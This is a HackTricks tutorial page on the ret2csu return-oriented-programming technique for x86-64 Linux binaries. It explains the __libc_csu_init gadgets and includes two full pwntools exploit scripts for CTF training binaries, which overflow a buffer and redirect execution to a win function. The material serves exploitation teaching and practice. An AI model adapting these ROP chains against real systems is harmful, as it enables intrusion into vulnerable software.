---
title: "Ret2csu"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/binary-exploitation/rop-return-oriented-programing/ret2csu.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: reversing
---

## Basic Information

**ret2csu** is a ROP technique for x86-64 ELF binaries that reuses instruction sequences traditionally linked into `__libc_csu_init` when ordinary register-pop gadgets are missing. The exact sequences and even the presence of that symbol depend on the compiler, C runtime, and startup objects, so always verify the target disassembly.[\[1\]](#references)[\[4\]](#references)

The classic pair provides a six-register pop sequence followed by register moves and an indirect call. Together they can set `rdx`, `rsi`, and the low 32 bits of `rdi`, then call through a pointer stored in memory.

### The Magic Gadgets in __libc_csu_init

In **`__libc_csu_init`**, there are two sequences of instructions (gadgets) to highlight:

1. The first sequence lets us set up values in several registers (rbx, rbp, r12, r13, r14, r15). These are like slots where we can store numbers or addresses we want to use later.

```
pop rbx;
pop rbp;
pop r12;
pop r13;
pop r14;
pop r15;
ret;
```
This gadget allows us to control these registers by popping values off the stack into them.

1. The second sequence uses the values we set up to do a couple of things:
  - **Move specific values into other registers** , making them ready for us to use as parameters in functions.
  - **Perform an indirect call** through the pointer at`r12 + rbx*8` .

```
mov rdx, r15;
mov rsi, r14;
mov edi, r13d;
call qword [r12 + rbx*8];
```
1. Maybe you don’t know any address to write there and you **need a `ret` instruction** . Note that the second gadget will also**end in a `ret`** , but you will need to meet some**conditions** in order to reach it:

```
mov rdx, r15;
mov rsi, r14;
mov edi, r13d;
call qword [r12 + rbx*8];
add rbx, 0x1;
cmp rbp, rbx
jnz <func>
...
ret
```
The conditions for the classic sequence are:

- `[r12 + rbx*8]` must be pointing to an address storing a callable function (if no idea and no pie, you can just use`_init` func):
  - If _init is at `0x400560` , use GEF to search for a pointer in memory to it and make`[r12 + rbx*8]` be the address with the pointer to _init:<sup>[\[4\]](#references)</sup>
- If _init is at

```
# Example from https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html
gef➤  search-pattern 0x400560
[+] Searching '\x60\x05\x40' in memory
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x400000-0x401000), permission=r-x
  0x400e38 - 0x400e44  →   "\x60\x05\x40[...]"
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x600000-0x601000), permission=r--
  0x600e38 - 0x600e44  →   "\x60\x05\x40[...]"
```
- Set the initial `rbp` to**`rbx + 1`** so that the post-call`add rbx, 1` makes`rbx == rbp` and avoids the loop.
- Account for the usually omitted `add rsp, 8` , six pops, and final`ret` when laying out the remainder of the chain.
- `mov edi, r13d` zero-extends only a 32-bit value into`rdi` ; this classic gadget cannot directly supply an arbitrary 64-bit first argument.

## RDI and RSI

Another way to control **`rdi`** and **`rsi`** from the ret2csu gadget is by accessing it specific offsets:[\[1\]](#references)

Check this page for more info:

[BROP - Blind Return Oriented Programming](brop-blind-return-oriented-programming.html)

## Example

### Using the call

Imagine you want to make a syscall or call a function like `write()` but need specific values in the `rdx` and `rsi` registers as parameters. Normally, you’d look for gadgets that set these registers directly, but you can’t find any.

Here’s where **ret2csu** comes into play:

1. **Set up the registers** with the pop gadget.
2. **Use the call gadget** to move the saved registers into argument registers and call through an attacker-selected pointer.

Two common instruction layouts use different saved registers. The classic gadget shown above uses `r15 → rdx`, `r14 → rsi`, `r13d → edi`, and calls `[r12 + rbx*8]`. The ROP Emporium challenge used below has a shifted layout: `r14 → rdx`, `r13 → rsi`, `r12d → edi`, and calls `[r15 + rbx*8]`. Never copy register comments without checking the binary.[\[2\]](#references)[\[4\]](#references)

You have an [**example using this technique and explaining it here**](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation), and this is the final exploit it used:[\[2\]](#references)

```
from pwn import *
elf = context.binary = ELF('./vuln')
p = process()
rop = ROP(elf)
POP_CHAIN = 0x00401224 # pop r12, r13, r14, r15, ret
REG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x00404028
rop.raw(b'A' * 40)
rop.gets(RW_LOC)
rop.raw(POP_CHAIN)
rop.raw(0)                      # r12
rop.raw(0)                      # r13
rop.raw(0xdeadbeefcafed00d)     # r14 - popped into RDX!
rop.raw(RW_LOC)                 # r15 - holds location of called function!
rop.raw(REG_CALL)               # all the movs, plus the call
p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['win']))            # send to gets() so it's written
print(p.recvline())                        # should receive "Awesome work!"
```
Warning

The previous exploit is not intended to produce general **RCE**. It calls the challenge’s `win` function: `gets` writes the function address to `RW_LOC`, `r15` points to that memory, and the indirect call dereferences it. The third argument in `rdx` is `0xdeadbeefcafed00d`.

### Bypassing the call and reaching ret

The following exploit was extracted [**from this page**](https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html) where the **ret2csu** is used but instead of using the call, it’s **bypassing the comparisons and reaching the `ret`** after the call:[\[3\]](#references)

```
# Code from https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html
# This exploit is based off of: https://www.rootnetsec.com/ropemporium-ret2csu/
from pwn import *
# Establish the target process
target = process('./ret2csu')
#gdb.attach(target, gdbscript = 'b *    0x4007b0')
# Our two __libc_csu_init rop gadgets
csuGadget0 = p64(0x40089a)
csuGadget1 = p64(0x400880)
# Address of ret2win and _init pointer
ret2win = p64(0x4007b1)
initPtr = p64(0x600e38)
# Padding from start of input to saved return address
payload = b"0"*0x28
# Our first gadget, and the values to be popped from the stack
# Also a value of 0xf means it is a filler value
payload += csuGadget0
payload += p64(0x0) # RBX
payload += p64(0x1) # RBP
payload += initPtr # R12, will be called in `CALL qword ptr [R12 + RBX*0x8]`
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xdeadcafebabebeef) # R15 > soon to be RDX
# Our second gadget, and the corresponding stack values
payload += csuGadget1
payload += p64(0xf) # qword value for the ADD RSP, 0x8 adjustment
payload += p64(0xf) # RBX
payload += p64(0xf) # RBP
payload += p64(0xf) # R12
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xf) # R15
# Finally the address of ret2win
payload += ret2win
# Send the payload
target.sendline(payload)
target.interactive()
```
### Why Not Just Use libc Directly?

Usually these cases are also vulnerable to [**ret2plt**](../common-binary-protections-and-bypasses/aslr/ret2plt.html) + [**ret2lib**](ret2lib/index.html), but sometimes you need to control more parameters than are easily controlled with the gadgets you find directly in libc. For example, the `write()` function requires three parameters, and **finding gadgets to set all these directly might not be possible**.

## References

- [1] [Hacking Blind (original BROP paper)](https://www.scs.stanford.edu/brop/bittau-brop.pdf)
- [2] [ret2csu exploitation - ir0nstone notes](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation)
- [3] [ropemporium_ret2csu - Nightmare (guyinatuxedo)](https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html)
- [4] [ROP Emporium - ret2csu challenge](https://ropemporium.com/challenge/ret2csu.html)
